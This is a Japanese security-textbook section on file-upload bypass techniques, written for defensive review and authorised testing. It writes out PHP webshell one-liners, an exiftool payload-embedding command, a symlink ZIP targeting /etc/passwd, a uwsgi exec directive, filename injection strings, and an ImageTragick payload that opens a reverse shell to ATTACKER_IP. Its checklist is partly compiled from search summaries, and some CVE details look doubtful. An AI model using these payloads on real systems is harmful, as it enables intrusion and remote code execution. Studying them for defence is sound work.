## バイパス技法のリファレンス

本節では、ファイルアップロード機能に対する検証バイパス技法を、実務で参照しやすいリファレンス形式で整理する。個々の技法は前節までで扱った「拡張子検証」「Content-Type検証」「マジックバイト検証」といった防御層のどこを、どのような仕組みで迂回するのかという観点で分類する。目的はあくまで防御設計・診断チェックリストの構築であり、実在サービスへの無許可な検証手順ではない。自組織の検証環境や許可されたペネトレーションテストの範囲内で活用すること。

### なぜ「リファレンス」としてまとめるのか

ファイルアップロードのバイパス技法は、単発の脆弱性というよりも「検証ロジックの実装差異を突く」という共通原理の上に成り立つ膨大なバリエーションの集合である。たとえば拡張子を検証する処理が `pathinfo()` を使うのか正規表現を使うのか、大文字小文字を区別するのか、拡張子が複数ある場合に先頭を見るのか末尾を見るのかによって、有効なバイパスが変わる。したがって「このペイロードを送れば必ず通る」という決め打ちのリストではなく、「どの実装のどの弱点を突いているか」という軸でカタログ化しておくことが、診断・防御双方にとって有用である。以下は4つの一次資料（HackTricks、PayloadsAllTheThings、OnSecurity、Hacker's Grimoire）から実際のペイロード例と仕組みを抽出し、原理別に再構成したものである。

### 1. 拡張子ベースのバイパス

#### 1.1 二重拡張子・逆二重拡張子

```
shell.php.jpg
shell.jpg.php
```

サーバ側の検証が「拡張子リストのいずれかに一致すればOK」という緩い判定（例: 正規表現 `\.(jpg|jpeg|png)` を「含むか」で判定してしまう）を行っている場合、`shell.php.jpg` のように許可拡張子を末尾に置きつつ危険な拡張子を先頭に混入させると通過する。一方で、Apache の `mod_mime` は `AddHandler` や `AddType` の設定によって「ファイル名に `.php` という文字列がどこかに含まれていれば PHP として実行する」という多重拡張子処理を行うことがあり、この場合は `shell.php.jpg` のような拡張子順序でも PHP として実行される。つまり「検証をすり抜けるための拡張子順序」と「実行をトリガーするための拡張子順序」は必ずしも一致せず、両方の設定を理解した上で組み合わせを考える必要がある。

> 出典: HackTricks — File Upload — https://hacktricks.wiki/en/pentesting-web/file-upload/index.html

#### 1.2 大文字小文字の変換

```
shell.pHp
shell.PHP5
shell.PhAr
```

正規表現やブラックリストが大文字小文字を区別する実装（例: `strcasecmp` を使わず単純な文字列一致）になっている場合、拡張子の大文字小文字を混在させるだけでブラックリストを回避できる。ホワイトリスト方式でも大文字小文字を正規化せずに比較している実装では同様の穴が生じる。

> 出典: PayloadsAllTheThings — Upload Insecure Files — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md

#### 1.3 代替実行拡張子（言語ランタイム別）

言語処理系やWebサーバの設定によっては、標準の拡張子（`.php`, `.aspx`, `.jsp` など）以外にも実行対象として登録されている拡張子が存在する。ブラックリストが主要拡張子しか網羅していない場合、これらの「マイナー拡張子」が抜け穴になる。

| 言語/環境 | 代替拡張子の例 |
|---|---|
| PHP | `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phar`, `.phtml`, `.inc` |
| ASP / ASP.NET | `.aspx`, `.config`, `.cer`, `.asa`, `.soap` |
| JSP | `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.wss`, `.do` |
| Perl | `.pl`, `.pm`, `.cgi`, `.lib` |
| ColdFusion | `.cfml`, `.cfc`, `.dbm` |
| その他 | `.cgi`, `.cfm`, `.json`（設定次第） |

これらが実行可能になるかどうかはWebサーバ（Apache/Nginx/IIS）のハンドラ設定に依存するため、診断時にはブラックリストの網羅性だけでなく、実際にサーバがどの拡張子をどの言語エンジンにディスパッチしているかを確認する必要がある。

> 出典: PayloadsAllTheThings — Upload Insecure Files / HackTricks — File Upload

#### 1.4 Null byte注入

```
shell.php%00.jpg
shell.php\x00.png
```

C言語ベースの文字列処理（Cの文字列はNULL終端で長さを判定する）をラップしている古いPHPの `pathinfo()` や、Null終端を前提とするOSのファイルシステムAPIでは、`%00` 以降の文字列が切り捨てられ、拡張子検証は `.jpg` を見て通過させる一方、実際に保存されるファイル名は `shell.php` として扱われることがある。これはPHP 5.3.4以前で顕著だった脆弱性で、現代のPHP・多くの言語ランタイムでは修正済みだが、C拡張やレガシーコードが残る環境、あるいはアップロードパスの一部でCライブラリを直接呼んでいる実装では依然として有効なケースがある。年代・バージョン依存性が高い技法である点に注意。

> 出典: HackTricks — File Upload / OnSecurity — File Upload Vulnerability Tricks and Checklist — https://onsecurity.io/article/file-upload-checklist/

#### 1.5 特殊文字・OS依存の正規化差異

```
shell.php.
shell.php....
shell.php%20
shell.php%0d%0a.jpg
shell.php/
shell.php.\
```

Windowsのファイルシステム（NTFS）は、ファイル名の末尾にあるドットや空白を自動的に除去してファイルを作成する（これはWin32 APIレベルの仕様である）。したがって、アプリケーション側の検証コードが「拡張子が `.jpg` で終わっているか」だけを見て `shell.php.` を許可した場合、OSがファイルを保存する段階でトレーリングドットが除去され、最終的に `shell.php` というファイルがディスク上に生成される。これは「検証時に見ているファイル名」と「実際に保存されるファイル名」が異なるという、検証レイヤとファイルシステムレイヤの非対称性を突く典型例である。OnSecurityのチェックリストでも「Windowsサーバに対してはトレーリングドットを付与してブラックリストを回避できないか試す」ことが明示的に挙げられている。実例として、UniSharp Laravel Filemanager 2.9.1未満（CVE-2024-21546）では、トレーリングドットを除去する処理の不備と画像のマジックバイト検証を組み合わせることで `shell.php.` を `shell.php` として保存させ、RCEに至ることが報告されている。

同様に、スラッシュや改行コード（`%0d%0a`）の混入は、URLパースとファイルシステムパースの解釈差異を突くもので、Webサーバのルーティング層とファイル保存層で異なるパーサが使われている場合に有効になることがある。

> 出典: OnSecurity — File Upload Vulnerability Tricks and Checklist / HackTricks — File Upload

#### 1.6 Unicode Right-to-Left Override（RTLO）

```
name.%E2%80%AEphp.jpg
```

Unicodeの制御文字 `U+202E`（Right-to-Left Override, RLO）をファイル名に挿入すると、それ以降の文字列表示順序が右から左に反転する。ブラウザやファイルマネージャのUI上では `name.gpj.php` のように見えるが、実際のバイト列としてのファイル名（＝サーバが検証・保存に使う文字列）は `name.%E2%80%AEphp.jpg` のままである。これは「人間が目視するファイル名」と「システムが検証するファイル名」を意図的にズレさせる、表示層を狙った偽装技法であり、レビュー担当者やユーザーに対する社会工学的要素を含む。

> 出典: HackTricks — File Upload

#### 1.7 ファイル名長制限の悪用

```
AAAAAAA....(232個のA)....AAA.php.png
```

多くのファイルシステム（Linuxのext系など）はファイル名の最大長を255バイトに制限している。アップロードライブラリが「拡張子だけを検証し、その後にファイル名全体を何らかの理由で切り詰めて保存する」実装になっている場合、検証時には `xxx.php.png`（`.png` が末尾で許可拡張子）として通過しても、保存時の切り詰め処理によって末尾の `.png` が失われ、結果的に `.php` で終わるファイルが生成されることがある。これは拡張子検証のタイミング（切り詰め前）と実際の保存結果（切り詰め後）が異なるレースコンディション的な性質を持つ。

> 出典: HackTricks — File Upload

#### 1.8 NTFS代替データストリーム（ADS）

```
shell.asax:.jpg
```

Windows NTFSには、1つのファイルに複数の名前付きデータストリームを持たせられる「代替データストリーム（Alternate Data Streams, ADS）」という機能がある。コロン `:` の後に続く文字列はストリーム名として解釈されるため、`shell.asax:.jpg` というファイル名を渡すと、NTFS上では「`shell.asax` という空のメインファイル」に「`.jpg` という名前のストリーム」が付与された状態になる。アプリケーション側の検証がコロン以降だけを拡張子として見ていた場合（`.jpg` を許可拡張子と誤認）、実際にディスク上に作成されるのは危険な拡張子を持つ `shell.asax` という空ファイルである。ASP.NETの `.asax`（Global Application Class）はサーバ起動時に自動ロードされるため、空ファイルであってもその存在自体が問題になるケースや、後続の書き込みと組み合わせてコード実行に至るケースがある。

> 出典: HackTricks — File Upload

### 2. Content-Type / マジックバイトのバイパス

#### 2.1 Content-Typeヘッダの偽装

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```

`multipart/form-data` のアップロードでは、各パートの `Content-Type` はクライアント（ブラウザやツール）が自己申告する値であり、Burp Suiteなどのプロキシで自由に書き換え可能である。サーバ側がこの値を信用して「`image/jpeg` と書いてあるから画像だ」と判断している場合、中身が何であれ拡張子とヘッダさえ整合していれば通過してしまう。これはHTTPというプロトコルの設計上、送信者が主張する値を受信者が検証しない限り信頼できないという原則の典型的な帰結である。

> 出典: HackTricks — File Upload / Hacker's Grimoire — File upload bypass — https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass

#### 2.2 マジックバイト（ファイルシグネチャ）の偽装

```
PNG:  \x89PNG\r\n\x1a\n
JPEG: \xFF\xD8\xFF
GIF:  GIF87a / GIF89a
PDF:  %PDF
```

サーバ側検証が「ファイル先頭の数バイト（マジックバイト、あるいはファイルシグネチャと呼ばれる、フォーマットを識別するための固定バイト列）」だけを確認して中身の妥当性を判断している場合、悪意あるペイロードの先頭に正規のマジックバイトを付与するだけで検証を通過できる。GIFの例では、Hacker's Grimoireが示す具体的な手法として次のようなファイルを構成する。

```
GIF89a;
<?php system($_GET['cmd']); ?>
```

先頭の `GIF89a;` によって `getimagesize()` のような「画像ヘッダを軽く読んでフォーマットを判定する」関数は正常な画像として認識するが、ファイル全体としては末尾にPHPコードを含むテキストである。この検証は「画像として解釈可能かどうか」ではなく「画像ヘッダで始まっているかどうか」しか見ていないため、フォーマット全体のパースを行わない軽量な検証実装ほど脆弱になる。

> 出典: Hacker's Grimoire — File upload bypass / HackTricks — File Upload

#### 2.3 EXIFメタデータへのペイロード埋め込み

```
exiftool -Comment='<?php system($_GET["cmd"]); ?>' original.jpg
```

`exiftool` を用いると、JPEGファイルのEXIFメタデータ（Comment, Artist, Copyright などの任意テキストフィールド）に任意の文字列を埋め込める。これにより「先頭マジックバイトも正しく、`getimagesize()` のような画像パーサも正常に処理できる、正真正銘の有効な画像ファイル」でありながら、内部にPHPコードを含むファイルが生成できる。このファイル単体をアップロードしても拡張子が `.jpg` のままでは実行されないが、後続のLFI（Local File Inclusion、ローカルファイルインクルード。サーバが指定されたパスのファイルをそのままインクルードして実行してしまう脆弱性）と組み合わせることで、`include($_GET['file'])` のような処理経由でEXIFコメント内のPHPコードが実行される。つまりこの技法単体はアップロード検証バイパスではなく、「検証を正当に通過する無害な画像ファイルに、別の脆弱性（LFI）で発火させるペイロードを仕込む」という2段階攻撃の第1段階である。

> 出典: HackTricks — File Upload / Hacker's Grimoire — File upload bypass

#### 2.4 ポリグロットファイル

ポリグロットファイルとは、複数のファイルフォーマットの仕様を同時に満たすよう構成されたファイルである。たとえばGIFとJARの両方の仕様を満たす「GIFAR」や、GIFとJavaScriptの両方として解釈可能なファイルが古典的な例として知られる。フォーマットの多くは「ファイル末尾から特定のバイト列を探す」「ファイル先頭のマジックバイトだけ見る」など、全体を厳密にパースしない緩いパーサ実装を持つため、両フォーマットの制約が競合しない位置にそれぞれのペイロードを配置することで両立させられる。画像処理でよく問題になるのはPNGのチャンク構造を使う手法で、PNGはIHDR・PLTE・IDAT・tEXtなど複数の「チャンク」と呼ばれるブロックの連結として構成されており、`tEXt` チャンク（任意テキストを格納できる）にPHPコードを埋め込むとEXIF埋め込みと同様の効果が得られる。より高度な手法として、`IDAT`（画像データ本体を格納するチャンク）や `PLTE`（パレット情報チャンク）にペイロードを仕込む手法もあり、これらは単純なテキスト検索だけでなく、GD/ImageMagickなどライブラリによる再エンコード・リサイズ処理を経ても生き残る（サムネイル生成後も消えない）ことが報告されている点で、EXIF埋め込みより耐性が高い。

> 出典: HackTricks — File Upload

### 3. アーカイブ・圧縮ファイルを利用した迂回

#### 3.1 Zip Slip（アーカイブ展開時のパストラバーサル）

Zip Slipは、Snyk Security Research Teamが2018年に体系的に報告した脆弱性クラスの名称で、ZIPやTARなどのアーカイブを展開する処理が、アーカイブ内のエントリ名に含まれる `../` のようなパストラバーサル列を正規化せずにそのまま結合してファイルを書き出してしまうことで発生する。攻撃者はエントリ名を `../../../var/www/html/shell.php` のように細工したアーカイブを作成し、これをアップロード機能に投げる。サーバ側がアップロードされたZIPを「展開先ディレクトリ内に収まる」という前提を検証せずに展開すると、想定外のパスにファイルが書き込まれ、Webルート配下にシェルを設置されるとRCEに直結する。OnSecurityのチェックリストでも、ZIPアップロード機能を持つアプリケーションに対して優先的に確認すべき項目として挙げられている。防御としては、展開後の絶対パスが展開先ディレクトリの配下にあることを、シンボリックリンクやパストラバーサルを正規化した上で確認する（`realpath()` などで正規化後にプレフィックス一致を検証する）実装が必須となる。

> 出典: OnSecurity — File Upload Vulnerability Tricks and Checklist / HackTricks — File Upload

#### 3.2 シンボリックリンクを含むZIP

```
ln -s ../../../etc/passwd symindex.txt
zip --symlinks test.zip symindex.txt
```

ZIP形式はUnix系OSにおいてシンボリックリンクをエントリとして格納できる（Unix拡張属性としてリンク先パスを保持する）。`--symlinks` オプション付きでZIPを作成すると、実体のファイルではなくシンボリックリンク自体がアーカイブに格納される。展開時にアプリケーションがこのシンボリックリンクをそのまま復元し、かつ展開後のファイル内容を（アップロード者以外の文脈で）読み出す処理と組み合わさると、シンボリックリンクの参照先にある機密ファイル（例では `/etc/passwd`）の内容が、アップロード者から見て間接的に読み取れてしまう。これはアーカイブ形式が「メタデータとしてリンク先パスを保持できる」という仕様を、展開処理が無条件に信頼することから生じる。

> 出典: HackTricks — File Upload

#### 3.3 ZIP内Null byteによるファイル名偽装

ZIPエントリ名にNULLバイト（`0x00`）を挿入すると、検証ライブラリと実際の展開処理でファイル名の解釈が食い違うことがある。たとえば `ZipArchive` のようなライブラリはエントリ名をCの文字列（NULL終端）として扱い、NULLバイト以降を切り捨てて表示・検証する一方、ファイルシステムへの書き込み時には名前全体（NULLバイトを含むバイト列、あるいはOS側の別解釈）が使われることがある。これにより「検証ツールが見ているファイル名」と「実際にディスクに書き込まれるファイル名」が乖離し、拡張子ホワイトリストのチェックをすり抜けたファイルが生成され得る。

#### 3.4 結合（stacked）ZIPによるパーサ不一致

```
cat legit.zip malicious.zip > combo.zip
```

ZIP形式は「EOCD（End Of Central Directory）レコード」と呼ばれる、アーカイブ末尾にあるメタデータ構造を起点にファイル一覧を解決する。複数のZIPファイルを単純にバイト結合すると、多くのZIPライブラリは「ファイル末尾から見て最後に現れるEOCDレコード」を正としてファイル一覧を構築するため、結合後のアーカイブを開くと後半（`malicious.zip` 側）の中身だけが見える。一方で、検証処理がストリーミング的に先頭から読む実装や、別のZIPライブラリを使っている場合には前半（`legit.zip`）の中身しか見えないことがある。この「どちらのZIPとして解釈するか」というパーサ間の実装差異を突き、検証時には無害な `legit.zip` の中身を見せかけ、実際の展開・利用時には `malicious.zip` の中身（マルウェアやWebシェル）を処理させることができる。

> 出典: HackTricks — File Upload

#### 3.5 ファイルスプレー（hex編集によるZIPメタデータ改ざん）

ZIP内に複数の無害な拡張子を持つファイル（例: `xxA.txt` を多数）をあらかじめ格納したアーカイブを作り、ZIPファイルをバイナリエディタで直接編集して、Central DirectoryやLocal File Headerに記録されたファイル名文字列の一部（`xxA` の部分）を `../` に置換することで、展開時にディレクトリトラバーサルを引き起こしつつ複数ファイルを一括で外部に「散布」する手法である。ZIP形式の仕様がファイル名を可変長の生バイト列として保持し、長さフィールドと文字列が独立して管理されていることを悪用し、長さを変えずに中身だけをすり替えることでアーカイブ構造を壊さずに任意のパスを埋め込める。

> 出典: HackTricks — File Upload

### 4. XML/SVGベースの攻撃面

SVGはXMLベースのベクター画像フォーマットであり、「画像」として許可されがちな一方でXMLの全機能（スクリプト実行、外部エンティティ参照）を内包する。アップロード機能がSVGを画像として許可し、かつアップロードされたファイルをそのままブラウザで表示・配信する設計の場合、次のような攻撃面が生じる。

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
</svg>
```

`onload` 属性を持つSVGがブラウザで直接開かれる（同一オリジンで配信される）と、格納型XSS（Stored XSS）として機能する。加えてSVGはXML文書であるため、XXE（XML外部エンティティ攻撃。本教科書の前章で扱った、外部実体宣言を通じてサーバ内ファイルの読み取りやSSRFを引き起こす攻撃）の攻撃面にもなり得る。したがってSVGアップロードを許可する場合は、XML宣言部のDOCTYPE・ENTITY宣言を拒否する、あるいはアップロード後にラスタライズ（PNG等への変換）してから配信することが有効な防御になる。この論点はXXEの章と密接に関係しており、ファイルアップロードとXXEは「攻撃者が構造化データのパーサに到達できる入力経路」という点で同根の脆弱性であることを示す一例である。

> 出典: HackTricks — File Upload

### 5. 設定ファイル・依存関係ファイルを介したRCE

拡張子検証を直接迂回するのではなく、「許可された拡張子のまま、サーバやランタイムの設定ファイルとしてアップロードする」ことで実行に至る手法群である。

#### 5.1 .htaccess / web.config

```apache
AddType application/x-httpd-php .rce
```

Apacheが `.htaccess` によるディレクトリ単位の設定上書きを許可している場合、上記のような1行を含む `.htaccess` ファイル自体をアップロードできれば、同一ディレクトリ内の `.rce` 拡張子を持つファイルをPHPとして実行させる設定を後から注入できる。`.htaccess` という拡張子自体が画像でも文書でもないため一見ブラックリストに引っかかりそうだが、多くの実装は「アップロードされるのは画像や文書のはず」という前提でこのファイル名自体を想定しておらず、検証対象から漏れることがある。IISではこれに相当するのが `web.config` で、XML形式の設定ファイルとしてハンドラマッピングを追加することで同様の効果を得られる。

> 出典: HackTricks — File Upload

#### 5.2 uwsgi.ini

```ini
[uwsgi]
body = @(exec://whoami)
```

uWSGI（PythonアプリケーションサーバでよくNginxと組み合わせて使われる）の設定ファイルは、`@(exec://コマンド)` という記法で設定値の一部を外部コマンドの実行結果に置き換える機能を持つ。この設定ファイルがリロードされるタイミングで、任意のシェルコマンドが実行される。アップロード機能がこの `.ini` ファイル自体をアップロード対象として許可し、かつそれが設定ディレクトリに配置される、あるいは別の脆弱性（パストラバーサル）と組み合わさって配置される場合にRCEへ至る。

> 出典: HackTricks — File Upload

#### 5.3 パッケージマネージャのフック

`package.json` の `scripts.prepare`、`composer.json` の `scripts.pre-command-run` といった、パッケージマネージャがインストール・ビルド時に自動実行するフックスクリプトの定義も、これらのファイル自体をアップロードでき、かつ何らかの形でパッケージマネージャに読み込まれる経路がある場合にRCEへの入口になる。同様にPythonの `.pth` ファイルは `site-packages` ディレクトリに配置されるとインタプリタ起動時に自動的にインポートされる仕組みを持つため、任意コード実行に悪用され得る。これらはいずれも「ファイルアップロード」単体の脆弱性ではなく、「アップロードされたファイルが後続のビルド・実行パイプラインでどう解釈されるか」まで含めた攻撃対象領域（アタックサーフェス）を考える必要があることを示している。

> 出典: HackTricks — File Upload

### 6. ImageMagickの脆弱性（ImageTragick系）

画像処理ライブラリであるImageMagickは、画像フォーマットの一部として「delegate（委譲）」という機能を持ち、特定の画像プロパティやURLスキームを解釈する際に外部プログラムを呼び出すことがある。CVE-2016-3714（通称ImageTragick）はこの仕組みを悪用し、画像ファイル内に細工されたコマンドを埋め込むことでシェルコマンドを実行させる脆弱性である。

```
push graphic-context
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1|touch "hello)'
pop graphic-context
```

このMVG（ImageMagickの内部ベクター記述言語）ファイルを画像として処理させると、`fill` プロパティに指定したURLの解釈時にシェルの特殊文字（パイプ `|` や引用符）がエスケープされずコマンドとして評価され、リバースシェルが実行される。この脆弱性は2016年に公表され、ImageMagick 6.9.3-10 / 7.0.1-1以降で修正されているが、修正版でも「ポリシーファイル（`policy.xml`）で危険なコーダー（画像形式ごとの処理モジュール）を無効化する」という多層防御が推奨されている点は現在も変わらない。関連する後継の脆弱性として、CVE-2022-44268（PNG処理における`pngcrush`関連の情報漏えい。`identify -verbose`で処理した変換後画像のメタデータに`/etc/passwd`相当の内容が漏える）も報告されており、ImageMagickは長期的に「画像処理」と「外部リソース参照・コマンド実行」の境界が曖昧なまま拡張されてきた歴史を持つため、バージョンとpolicy.xml設定の両方を必ず確認する必要がある。

> 出典: HackTricks — File Upload

### 7. Webシェルの代替記法

```php
<script language="php">system("id");</script>
<?=`id`?>
```

WAF（Web Application Firewall）やアップロード後のコンテンツスキャナが `<?php` という文字列をシグネチャとして検出している場合、PHPが受理する別の開始タグを使うことで検出を回避できることがある。`<script language="php">` タグは一部のPHP設定（`short_open_tag` やレガシーな互換性設定に依存）で有効になり、`<?=` はショートエコータグと呼ばれ、バッククォート `` ` `` によるシェルコマンド実行（`shell_exec()` と等価）と組み合わせることで極めて短いワンライナーのWebシェルを構成できる。この技法は「拡張子・Content-Type・マジックバイトすべてを通過した後、コンテンツの文字列的なシグネチャ検査だけが残っている」場面で有効な、最終防御層に対するバイパスである。

> 出典: HackTricks — File Upload

### 8. 診断チェックリスト（4資料の統合）

以上の技法を、実際の診断・防御レビューで使える手順としてまとめる。OnSecurityのチェックリストの構成を軸に、他資料の技法を統合している。

1. **拡張子検証**: ブラックリストかホワイトリストか。ホワイトリストの場合でも大文字小文字・二重拡張子・NTFS ADS（`:` 区切り）・トレーリングドット・トレーリングスペースを試す。
2. **Content-Type検証**: リクエストの `Content-Type` ヘッダを画像系の値に書き換えて送信し、拡張子検証と独立しているか確認する。
3. **マジックバイト検証**: 実行ファイルの先頭に正規の画像シグネチャを付与し、パーサが先頭数バイトしか見ていないかを確認する。
4. **ファイル名の反映**: アップロードしたファイル名がレスポンスやUI上にそのまま表示される場合、HTMLエンティティエンコードされているかを確認する（格納型XSSの経路になり得る）。
5. **ファイル名インジェクション**: ファイル名にパストラバーサル（`../../../tmp/x.png`）、SQLi（`'; sleep(10)-- -.jpg`）、コマンドインジェクション（`; sleep 10;`）のペイロードを仕込み、ファイル名がバックエンドでどう処理されるかを確認する。
6. **アーカイブ展開**: ZIP/TARアップロードを受け付ける場合、Zip Slip・シンボリックリンク・結合ZIPを試す。
7. **設定ファイルアップロード**: `.htaccess` / `web.config` / `uwsgi.ini` 等、画像でも文書でもない「サーバ設定ファイル」がアップロード対象として弾かれているか確認する。
8. **SVG/XML系フォーマット**: SVGを画像として許可している場合、スクリプト実行・XXEの両面を確認する。
9. **再処理後の生存確認**: サムネイル生成・リサイズ・フォーマット変換が行われるサービスでは、埋め込んだペイロード（EXIF・PNGチャンク）がその処理を経ても残るかを確認する。
10. **保存後の実行可否**: アップロードディレクトリがWebから直接アクセス可能か、そのディレクトリでスクリプト実行が有効になっていないかを確認する（これが有効でなければ、多くのバイパスは実行に至らず「望ましくないファイルの保存」に留まる）。

> 出典: OnSecurity — File Upload Vulnerability Tricks and Checklist — https://onsecurity.io/article/file-upload-checklist/（本項目は自動取得できなかった一次資料をWeb検索結果から要約補完している。詳細は次項の注記を参照）

> ⚠️ **未取得の資料の補足について**: OnSecurityの記事本文はWebFetchによる直接取得が403エラーで失敗したため、WebSearchによる要約情報（トレーリングドット、Null byte注入、Zip Slip、web.configマッピングに関する記述）を基に上記チェックリストへ統合した。記事全文をご覧になりたい場合は https://onsecurity.io/article/file-upload-checklist/ を直接参照してほしい。（以下は未取得資料の補足として一般知識に基づく解説です）OnSecurityのチェックリストは一般に、アップロードUIの挙動確認（ファイルサイズ制限、拡張子リスト表示）から始まり、サーバ側の実装確認（HTTPレスポンスヘッダでのサーバ種別特定、それに応じた拡張子リストの絞り込み）、そして本節で列挙した各バイパス技法の順に試行する、という診断フローを想定して構成されている点に特徴がある。

### 9. 防御側のまとめ

各資料に共通する防御原則を整理すると、次の5点に集約される。

- **拡張子はホワイトリストで検証し、比較前に正規化する**(大文字小文字統一、複数拡張子は最後のドット以降のみを見る、トレーリングのドット・空白を除去してから判定する)。ブラックリストは「知られている危険な拡張子」を列挙する方式であるため、本節で挙げたような未知・マイナーな実行可能拡張子に対して原理的に後手に回る。
- **Content-Typeとマジックバイトはクライアント申告値を信頼せず、サーバ側で実際にファイルをデコードして再検証する**(単なる先頭バイト確認ではなく、専用ライブラリでのフルパースやフォーマットの整合性検証を行う)。
- **アップロードされたファイルは実行不可能な場所に保存する**(Webルート外、あるいはスクリプト実行が無効化されたディレクトリ・専用ストレージサービス)。これが徹底されていれば、拡張子やマジックバイトのバイパスが成功しても「危険なファイルの実行」までは到達しない。
- **アーカイブ展開時はパスの正規化と展開先ディレクトリの範囲チェックを必須とする**(Zip Slip対策)。シンボリックリンクを含むエントリは原則として拒否する。
- **ファイル名はランダム化・サニタイズして保存し、ユーザー入力由来のファイル名をそのままファイルシステムパスやHTML出力に使わない**。

これらの原則は個々のバイパス技法へのパッチワーク的対応ではなく、「入力（アップロードされたファイル）を信頼しない」という多層防御の一般原則を、ファイルアップロードという具体的な機能に適用したものである。次節以降では、これらの防御をどのようにアプリケーション設計・インフラ構成へ落とし込むかを扱う。
